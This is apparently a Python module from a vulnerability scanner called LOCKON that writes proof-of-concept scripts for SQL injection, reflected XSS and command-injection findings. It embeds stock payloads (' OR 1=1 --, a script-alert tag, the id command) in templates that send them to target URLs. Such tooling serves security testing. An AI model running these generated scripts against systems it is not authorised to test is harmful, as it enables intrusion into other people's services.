import os
import time
from urllib.parse import quote

class GhostWriter:
    """
    Project GHOST WRITER: Auto-PoC Generator.
    Creates standalone Python scripts to verify vulnerabilities found by LOCKON.
    """
    def __init__(self, output_dir="pocs"):
        self.output_dir = output_dir
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
            
    def generate_poc(self, finding):
        """
        Generates a PoC script based on the finding type.
        """
        vuln_type = finding.get("type", "Unknown")
        severity = finding.get("severity", "Low")
        
        # Only generate for High/Critical or specific types
        if severity not in ["High", "Critical"] and vuln_type not in ["SQL Injection", "XSS", "RCE"]:
            return None
            
        script_content = None
        timestamp = int(time.time())
        filename = f"exploit_{vuln_type.lower().replace(' ', '_')}_{timestamp}.py"
        filepath = os.path.join(self.output_dir, filename)
        
        if "SQL Injection" in vuln_type:
            script_content = self._template_sqli(finding)
        elif "XSS" in vuln_type:
            script_content = self._template_xss(finding)
        elif "RCE" in vuln_type or "Command Injection" in vuln_type:
            script_content = self._template_rce(finding)
            
        if script_content:
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(script_content)
            return filepath
        return None

    def _template_sqli(self, finding):
        target = finding.get("url")
        payload = finding.get("payload", "' OR 1=1 --")
        
        return f'''# LOCKON Auto-Generated PoC: SQL Injection
# Target: {target}
# Payload: {payload}

import requests

target_url = "{target}"
payload = "{payload}"

print(f"[*] Testing target: {{target_url}}")
print(f"[*] Sending payload: {{payload}}")

# This is a generic SQLi verification template
# You may need to adjust the injection point (GET/POST)

try:
    # Assuming GET parameter injection for simplicity in this template
    # Ideally, LOCKON provides the exact injection point
    resp = requests.get(target_url, timeout=10)
    
    print(f"[*] Response Code: {{resp.status_code}}")
    print(f"[*] Response Length: {{len(resp.text)}}")
    
    if resp.status_code == 200:
        print("[+] Request successful. Check response content for verification.")
        # Manual verification required here to be sure, or check for specific SQL errors
    else:
        print("[-] Request failed or blocked.")

except Exception as e:
    print(f"[-] Error: {{e}}")
'''

    def _template_xss(self, finding):
        target = finding.get("url")
        payload = finding.get("payload", "<script>alert(1)</script>")
        
        return f'''# LOCKON Auto-Generated PoC: XSS
# Target: {target}
# Payload: {payload}

import requests
from urllib.parse import quote

target_url = "{target}"
payload = "{payload}"

print(f"[*] Testing target: {{target_url}}")
print(f"[*] Payload: {{payload}}")

# Open this URL in a browser to verify Reflected XSS
print("\\n[+] Open the following URL in your browser:")
print(f"{{target_url}}{{payload}}") # Simplified, assumes URL ends with param=
'''

    def _template_rce(self, finding):
        target = finding.get("url")
        payload = finding.get("payload", "id")
        
        return f'''# LOCKON Auto-Generated PoC: RCE
# Target: {target}
# Payload: {payload}

import requests

target_url = "{target}"
payload = "{payload}" # Command to execute

print(f"[*] Testing RCE on: {{target_url}}")
print(f"[*] Command: {{payload}}")

try:
    # Simple GET RCE Template
    resp = requests.get(target_url + payload, timeout=10)
    
    print(f"[*] Output:\\n")
    print(resp.text)

except Exception as e:
    print(f"[-] Error: {{e}}")
'''
